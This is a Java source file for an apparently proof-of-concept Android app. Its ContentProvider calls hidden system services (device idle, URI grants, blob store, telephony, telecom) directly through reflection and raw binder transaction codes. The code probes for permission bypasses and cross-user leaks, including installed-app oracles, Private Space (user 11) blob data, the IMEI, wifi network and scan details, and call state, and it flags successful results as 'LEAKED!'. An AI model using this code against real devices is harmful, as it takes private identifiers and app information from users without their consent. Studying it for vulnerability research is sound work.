package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class SystemOracleProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        String path = uri.getPath();
        if (path != null && path.contains("doze")) {
            probeDeviceIdle(cursor);
        } else if (path != null && path.contains("urigrants")) {
            probeUriGrants(cursor);
        } else if (path != null && path.contains("wifi")) {
            probeWifi(cursor);
        } else if (path != null && path.contains("telephony")) {
            probeTelephonyRegistry(cursor);
        } else {
            probeDeviceIdle(cursor);
            probeUriGrants(cursor);
            probeWifi(cursor);
            probeTelephonyRegistry(cursor);
        }

        return cursor;
    }

    private void probeDeviceIdle(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("deviceidle");
        if (binder == null) { cursor.addRow(new Object[]{"deviceidle", "no_binder"}); return; }
        String desc = "android.os.IDeviceIdleController";

        // IDeviceIdleController methods:
        // getAppIdWhitelist() - returns UIDs on the doze whitelist
        // getAppIdWhitelistExceptIdle() - same but excludes idle
        // getFullPowerWhitelistExceptIdle() - returns package names!
        // getFullPowerWhitelist() - returns package names!
        // isPowerSaveWhitelistApp(String packageName) - oracle!

        // Try isPowerSaveWhitelistApp for various apps
        // This could be an app installation oracle if it returns different for installed vs not installed
        String[] testPkgs = {"com.google.android.gm", "com.android.chrome",
                             "com.google.android.apps.messaging", "com.whatsapp",
                             "com.totally.fake.app.nonexistent",
                             "com.google.android.apps.photos", "com.google.android.youtube",
                             "com.twitter.android", "com.instagram.android"};

        // Scan TX codes. In Android 14+:
        // TX=1: addPowerSaveWhitelistApp
        // TX=2: removePowerSaveWhitelistApp
        // TX=3: removeSystemPowerWhitelistApp
        // TX=4: restoreSystemPowerWhitelistApp
        // TX=5: isPowerSaveWhitelistExceptIdleApp
        // TX=6: isPowerSaveWhitelistApp
        // TX=7: getSystemPowerWhitelistExceptIdle
        // TX=8: getSystemPowerWhitelist
        // TX=9: getUserPowerWhitelist (returns String[])
        // TX=10: getFullPowerWhitelistExceptIdle (returns String[])
        // TX=11: getFullPowerWhitelist (returns String[])
        // TX=12: getAppIdWhitelistExceptIdle (returns int[])
        // TX=13: getAppIdWhitelist (returns int[])

        // TX=6: isPowerSaveWhitelistApp(String pkg) -> bool
        for (String pkg : testPkgs) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(pkg);
                binder.transact(6, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0 && reply.dataAvail() >= 4) {
                    int val = reply.readInt();
                    cursor.addRow(new Object[]{"doze_wl_" + pkg.substring(pkg.lastIndexOf('.')+1), String.valueOf(val != 0)});
                } else {
                    String msg = null;
                    try { msg = reply.readString(); } catch (Exception ignored) {}
                    cursor.addRow(new Object[]{"doze_wl_" + pkg.substring(pkg.lastIndexOf('.')+1), "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"doze_wl_" + pkg.substring(pkg.lastIndexOf('.')+1), "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=10: getFullPowerWhitelistExceptIdle() -> String[]
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(10, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                if (avail >= 4) {
                    int count = reply.readInt();
                    cursor.addRow(new Object[]{"whitelist_count", String.valueOf(count)});
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < Math.min(count, 30); i++) {
                        String pkg = reply.readString();
                        if (pkg != null) sb.append(pkg).append("|");
                    }
                    String list = sb.toString();
                    while (list.length() > 0) {
                        int end = Math.min(list.length(), 200);
                        cursor.addRow(new Object[]{"whitelist_pkgs", list.substring(0, end)});
                        list = list.substring(end);
                    }
                } else {
                    cursor.addRow(new Object[]{"whitelist", "OK avail=" + avail});
                }
            } else {
                String msg = null;
                try { msg = reply.readString(); } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"whitelist", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"whitelist", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=9: getUserPowerWhitelist() -> String[] (user-added packages!)
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(9, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                if (avail >= 4) {
                    int count = reply.readInt();
                    cursor.addRow(new Object[]{"userWhitelist_count", String.valueOf(count)});
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < Math.min(count, 20); i++) {
                        String pkg = reply.readString();
                        if (pkg != null) sb.append(pkg).append("|");
                    }
                    if (sb.length() > 0) {
                        cursor.addRow(new Object[]{"userWhitelist_pkgs", truncate(sb.toString())});
                    }
                }
            } else {
                String msg = null;
                try { msg = reply.readString(); } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"userWhitelist", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"userWhitelist", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // TX=7: getSystemPowerWhitelistExceptIdle() -> String[]
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(7, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0 && reply.dataAvail() >= 4) {
                int count = reply.readInt();
                cursor.addRow(new Object[]{"sysWhitelistExIdle_count", String.valueOf(count)});
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < Math.min(count, 30); i++) {
                    String pkg = reply.readString();
                    if (pkg != null) sb.append(pkg).append("|");
                }
                String list = sb.toString();
                while (list.length() > 0) {
                    int end = Math.min(list.length(), 200);
                    cursor.addRow(new Object[]{"sysWhitelistExIdle", list.substring(0, end)});
                    list = list.substring(end);
                }
            } else {
                String msg = null;
                try { msg = reply.readString(); } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"sysWhitelistExIdle", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"sysWhitelistExIdle", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // TX=8: getSystemPowerWhitelist() -> String[]
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(8, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0 && reply.dataAvail() >= 4) {
                int count = reply.readInt();
                cursor.addRow(new Object[]{"sysWhitelist_count", String.valueOf(count)});
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < Math.min(count, 30); i++) {
                    String pkg = reply.readString();
                    if (pkg != null) sb.append(pkg).append("|");
                }
                String list = sb.toString();
                while (list.length() > 0) {
                    int end = Math.min(list.length(), 200);
                    cursor.addRow(new Object[]{"sysWhitelist", list.substring(0, end)});
                    list = list.substring(end);
                }
            } else {
                String msg = null;
                try { msg = reply.readString(); } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"sysWhitelist", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"sysWhitelist", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // TX=12/13: getAppIdWhitelistExceptIdle/getAppIdWhitelist -> int[] (UIDs)
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(13, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                if (avail >= 4) {
                    int count = reply.readInt();
                    cursor.addRow(new Object[]{"uidWhitelist_count", String.valueOf(count)});
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < Math.min(count, 50); i++) {
                        if (reply.dataAvail() >= 4) {
                            sb.append(reply.readInt()).append(",");
                        }
                    }
                    String uids = sb.toString();
                    if (uids.length() > 0) {
                        cursor.addRow(new Object[]{"uidWhitelist", truncate(uids)});
                    }
                }
            } else {
                String msg = null;
                try { msg = reply.readString(); } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"uidWhitelist", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"uidWhitelist", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void probeUriGrants(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("uri_grants");
        if (binder == null) { cursor.addRow(new Object[]{"uri_grants", "no_binder"}); return; }
        String desc = "android.app.IUriGrantsManager";

        // TX=6 returned OK avail=8 - investigate what it is
        // IUriGrantsManager methods (Android 16):
        // TX=1: takePersistableUriPermission
        // TX=2: releasePersistableUriPermission
        // TX=3: getPersistedUriPermissions(String, boolean, boolean) -> ParceledListSlice
        // TX=4: getGrantedUriPermissions(String, int) - requires GET_APP_GRANTED_URI_PERMISSIONS
        // TX=5: clearGrantedUriPermissions(String, int) - requires CLEAR_APP_GRANTED_URI_PERMISSIONS
        // TX=6: checkGrantUriPermission_ignoreNonSystem(int uid, String targetPkg, Uri uri, int modeFlags, int userId)
        // TX=7: checkAuthorityGrants(int callingUid, ProviderInfo, int userId, boolean checkUser)

        // TX=3: getPersistedUriPermissions - our own persisted permissions
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            data.writeInt(1); // incoming=true
            data.writeInt(1); // persistedOnly=true
            binder.transact(3, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"persistedUri", "OK avail=" + avail});
            } else {
                String msg = null;
                try { msg = reply.readString(); } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"persistedUri", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"persistedUri", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // Now probe BlobStoreManager
        probeBlobStore(cursor);
    }

    private void probeBlobStore(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("blob_store");
        if (binder == null) { cursor.addRow(new Object[]{"blob_store", "no_binder"}); return; }
        String desc = "android.app.blob.IBlobStoreManager";

        // IBlobStoreManager methods:
        // TX=1: createSession(BlobHandle blobHandle, int userId) -> long sessionId
        // TX=2: openSession(long sessionId, int userId) -> ISession
        // TX=3: abandonSession(long sessionId, int userId)
        // TX=4: getLeasedBlobs(int userId) -> ParceledListSlice<BlobInfo>
        // TX=5: acquireLease(BlobHandle, int descResId, CharSequence desc, long expiry, int userId)
        // TX=6: releaseLease(BlobHandle, int userId)
        // TX=7: getRemainingLeaseQuotaBytes(int userId) -> long
        // TX=8: waitForIdle(RemoteCallback)
        // TX=9: deleteBlob(int) - for shell
        // TX=10: queryBlobsForUser(int userId) -> ParceledListSlice<BlobInfo> (DUMP perm)

        // TX=4: getLeasedBlobs - our own leased blobs (might expose what we share)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0); // userId
            binder.transact(4, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"getLeasedBlobs_u0", "OK avail=" + avail});
            } else {
                String msg = null;
                try { msg = reply.readString(); } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"getLeasedBlobs_u0", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getLeasedBlobs_u0", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // TX=7: getRemainingLeaseQuotaBytes(String packageName, int userId)
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName()); // packageName
            data.writeInt(0); // userId
            binder.transact(7, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0 && reply.dataAvail() >= 8) {
                long quota = reply.readLong();
                cursor.addRow(new Object[]{"blobQuota_u0", "quota=" + quota});
            } else if (ex == 0 && reply.dataAvail() >= 4) {
                // Might be int instead of long
                int val = reply.readInt();
                cursor.addRow(new Object[]{"blobQuota_u0", "val=" + val});
            } else {
                String msg = null;
                try { msg = reply.readString(); } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"blobQuota_u0", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"blobQuota_u0", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // Try for user 11 (Private Space) - cross-user
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            data.writeInt(11); // userId - Private Space
            binder.transact(7, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0 && reply.dataAvail() >= 8) {
                long quota = reply.readLong();
                cursor.addRow(new Object[]{"blobQuota_u11", "LEAKED! quota=" + quota});
            } else if (ex == 0 && reply.dataAvail() >= 4) {
                int val = reply.readInt();
                cursor.addRow(new Object[]{"blobQuota_u11", "LEAKED! val=" + val});
            } else {
                String msg = null;
                try { msg = reply.readString(); } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"blobQuota_u11", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"blobQuota_u11", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // Try querying other packages' quotas
        String[] otherPkgs = {"com.google.android.gms", "com.android.chrome", "com.totally.fake"};
        for (String pkg : otherPkgs) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(pkg);
                data.writeInt(0);
                binder.transact(7, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0 && reply.dataAvail() >= 4) {
                    long quota = reply.readLong();
                    cursor.addRow(new Object[]{"blobQuota_" + pkg.substring(pkg.lastIndexOf('.')+1), "quota=" + quota});
                } else {
                    String msg = null;
                    try { msg = reply.readString(); } catch (Exception ignored) {}
                    cursor.addRow(new Object[]{"blobQuota_" + pkg.substring(pkg.lastIndexOf('.')+1), "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"blobQuota_" + pkg.substring(pkg.lastIndexOf('.')+1), "ERR"});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=10: queryBlobsForUser - the juicy one (requires DUMP_ACTIVITY)
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0); // userId
            binder.transact(10, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"queryBlobs_u0", "SUCCESS! avail=" + avail});
            } else {
                String msg = null;
                try { msg = reply.readString(); } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"queryBlobs_u0", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"queryBlobs_u0", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // TX=4: getLeasedBlobs for user 11
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(11); // userId
            binder.transact(4, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"getLeasedBlobs_u11", "LEAKED! avail=" + avail});
            } else {
                String msg = null;
                try { msg = reply.readString(); } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"getLeasedBlobs_u11", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getLeasedBlobs_u11", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void probeWifi(MatrixCursor cursor) {
        // WifiManager - can reveal connected network info without location permission?
        try {
            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager)
                getContext().getApplicationContext().getSystemService("wifi");
            android.net.wifi.WifiInfo info = wm.getConnectionInfo();
            if (info != null) {
                cursor.addRow(new Object[]{"wifi_ssid", info.getSSID()});
                cursor.addRow(new Object[]{"wifi_bssid", String.valueOf(info.getBSSID())});
                cursor.addRow(new Object[]{"wifi_rssi", String.valueOf(info.getRssi())});
                cursor.addRow(new Object[]{"wifi_freq", String.valueOf(info.getFrequency())});
                cursor.addRow(new Object[]{"wifi_ip", intToIp(info.getIpAddress())});
                cursor.addRow(new Object[]{"wifi_mac", info.getMacAddress()});
                cursor.addRow(new Object[]{"wifi_speed", String.valueOf(info.getLinkSpeed())});
            } else {
                cursor.addRow(new Object[]{"wifi_info", "null"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"wifi", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }

        // Try getScanResults without location permission
        try {
            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager)
                getContext().getApplicationContext().getSystemService("wifi");
            java.util.List<android.net.wifi.ScanResult> results = wm.getScanResults();
            cursor.addRow(new Object[]{"wifi_scan_count", String.valueOf(results.size())});
            for (int i = 0; i < Math.min(results.size(), 5); i++) {
                android.net.wifi.ScanResult r = results.get(i);
                cursor.addRow(new Object[]{"wifi_scan_" + i, "ssid=" + r.SSID + " bssid=" + r.BSSID + " freq=" + r.frequency});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"wifi_scan", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }
    }

    private void probeTelephonyRegistry(MatrixCursor cursor) {
        // TelephonyRegistry - broadcasts phone state, but can we query directly?
        IBinder binder = getServiceBinder("telephony.registry");
        if (binder == null) { cursor.addRow(new Object[]{"tel_reg", "no_binder"}); return; }
        String desc = "com.android.internal.telephony.ITelephonyRegistry";

        // Listen for call state changes (normally requires READ_PHONE_STATE)
        // But some APIs might leak info without permission

        // Try via TelephonyManager
        try {
            android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager)
                getContext().getSystemService("phone");
            // getNetworkOperatorName - no permission needed
            cursor.addRow(new Object[]{"network_op", tm.getNetworkOperatorName()});
            cursor.addRow(new Object[]{"network_type", String.valueOf(tm.getNetworkType())});
            cursor.addRow(new Object[]{"sim_operator", tm.getSimOperatorName()});
            cursor.addRow(new Object[]{"sim_country", tm.getSimCountryIso()});
            cursor.addRow(new Object[]{"phone_count", String.valueOf(tm.getPhoneCount())});
            cursor.addRow(new Object[]{"is_sms_capable", String.valueOf(tm.isSmsCapable())});
            cursor.addRow(new Object[]{"data_state", String.valueOf(tm.getDataState())});

            // These require permission but let's see what happens
            try {
                cursor.addRow(new Object[]{"call_state", String.valueOf(tm.getCallState())});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"call_state", "ERR:" + e.getClass().getSimpleName()});
            }

            // Subscriber ID / IMEI require permission
            try {
                Method getImei = tm.getClass().getMethod("getImei");
                String imei = (String) getImei.invoke(tm);
                cursor.addRow(new Object[]{"imei", imei != null ? "LEAKED! " + imei : "null"});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"imei", "ERR:" + e.getClass().getSimpleName()});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"telephony", "ERR:" + e.getClass().getSimpleName()});
        }

        // Probe telecom service for call log access
        IBinder telecom = getServiceBinder("telecom");
        if (telecom != null) {
            String telecomDesc = "com.android.internal.telecom.ITelecomService";
            // isInCall() - reveals if user is on a phone call (privacy sensitive!)
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(telecomDesc);
                data.writeString(getContext().getPackageName());
                // TX=24 in recent Android: isInCall(String callingPackage)
                binder.transact(24, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0 && reply.dataAvail() >= 4) {
                    int inCall = reply.readInt();
                    cursor.addRow(new Object[]{"isInCall", "val=" + inCall});
                }
            } catch (Exception e) {
                // skip
            }
            data.recycle();
            reply.recycle();

            // Try various TX codes on telecom
            for (int tx : new int[]{1, 5, 10, 15, 20, 25, 30, 35}) {
                data = Parcel.obtain();
                reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(telecomDesc);
                    data.writeString(getContext().getPackageName());
                    data.writeString(null);
                    boolean result = telecom.transact(tx, data, reply, 0);
                    if (result) {
                        int ex = reply.readInt();
                        if (ex == 0 && reply.dataAvail() > 0) {
                            cursor.addRow(new Object[]{"telecom_tx" + tx, "OK avail=" + reply.dataAvail()});
                        } else if (ex != 0) {
                            String msg = null;
                            try { msg = reply.readString(); } catch (Exception ignored) {}
                            if (msg != null && msg.contains("Security")) {
                                cursor.addRow(new Object[]{"telecom_tx" + tx, "SEC:" + truncate(msg)});
                            }
                        }
                    }
                } catch (Exception e) {
                    // skip
                }
                data.recycle();
                reply.recycle();
            }
        }
    }

    private String intToIp(int ip) {
        return (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "." + ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
